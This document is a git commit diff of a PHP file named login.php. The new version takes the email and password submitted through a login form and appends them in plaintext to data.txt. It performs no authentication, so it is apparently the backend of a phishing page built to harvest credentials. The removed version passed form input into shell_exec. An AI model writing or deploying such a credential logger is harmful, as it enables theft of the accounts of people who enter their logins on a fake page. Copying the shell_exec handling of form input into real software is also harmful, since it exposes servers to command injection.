4437ae19ff101c724fd2a553562e2f3b97005f52
gpaiva-13 <75822076+gpaiva-13@users.noreply.github.com>
2020-12-11 20:57:54 -0300

    Update login.php

--- login.php
+++ login.php
@@ -1,6 +1,13 @@
 <?php
-$email =escapeshellcmd($_POST["email"]);
-$password = escapeshellcmd($_POST["password"]);
+$email = $_POST['login_email'];
+$password = $_POST['login_password'];
 
-shell_exec(" echo Email: ". $email ."  and Password: " . " >>data.txt");
+if(isset($_POST['btnLogin'])){
+  $open = fopen('data.txt','a');
+  fwrite($open,$email);
+  fwrite($open, '::');
+  fwrite($open,$password);
+  fwrite($open, '\n');
+}
+
 ?>
